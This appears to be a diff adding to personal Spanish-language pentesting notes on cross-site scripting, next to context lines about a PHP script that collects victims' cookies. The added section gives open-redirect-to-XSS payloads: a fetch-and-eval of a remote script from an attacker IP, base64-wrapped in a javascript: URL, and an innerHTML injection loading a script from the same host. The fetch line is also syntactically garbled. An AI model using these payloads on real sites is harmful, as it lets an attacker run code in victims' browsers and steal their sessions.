@@ -166,3 +166,11 @@ if (isset($_GET['c'])) {
 #Con el codigo PHP de arriba podriamos crear un archivo donde se van almacenando las difierentes cookies de las personas.
 #Este codigo php es el index.php que se ve en el payload de mas arriba
 
+### Open redirect to XSS
+-> Dudas de open redirect en openredirect.txt
+fetch("<ip>/recurso.js".then(r=>r.text().then(eval))) | base64 -w 0:echo
+#Obtengo en base64 el payload para que se consulte el recurso en la ip que se determino
+javascript(eval(atob("base64string"))) -> En caso de que no funcione probar el siguiente
+javascript:document.body.innerHTML='<script src="http://<ip>/recurso.js"></script>' -> En caso de que no funcione, probar url encodeando desde document o etc
+#Permite hacer un XSS realizando la consulta del base64 (opc 1) o con innerhtml (opc 2). En el recurso deberia estar el XSS que queremos que sea interpretado (ej. alert(XSS))
+
